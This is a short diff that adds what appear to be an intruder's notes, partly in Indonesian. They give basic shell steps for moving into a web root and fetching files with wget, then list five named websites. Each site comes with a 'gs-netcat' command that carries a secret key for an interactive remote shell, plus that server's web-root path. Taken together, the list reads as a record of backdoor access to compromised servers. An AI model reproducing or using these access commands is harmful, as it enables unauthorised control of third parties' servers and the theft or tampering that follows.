@@ -1,0 +1,29 @@
+cd (path depan)
+contoh : cd /home2/lmsuser/public_html/
+baru wget
+
+pwd : untuk cek kita ada di folder mana
+ls : untuk lihat ada isi file apa aja di dalam
+
+https://marcodastresfronteiras.com.br/
+gs-netcat -s "GrmmUec3rHqs5YjjeF5qzw" -i
+
+/var/www/vhosts/marcodastresfronteiras.com.br/httpdocs/
+
+
+https://niituniversity.in/
+gs-netcat -s "4BBwaiWqp2CNQBW31GZX2K" -i
+/var/www/html/NIIT/ 
+
+https://www.dotechon.com/
+gs-netcat -s "5czuLWDgAoLjfYrwDiXiXg" -i
+/home/n763965/dotechon.com/ 
+
+https://nelsoschneider.com.br/
+gs-netcat -s "H4ywaaboJz2zvqqcB4ZwyQ" -i
+/home2/nelsos62/public_html/
+
+https://activebalancehealth.ca/
+gs-netcat -s "7UGvPKJuRDZnH6QrKU2Vz7" -i
+/home/activebalancehea/public_html/
+
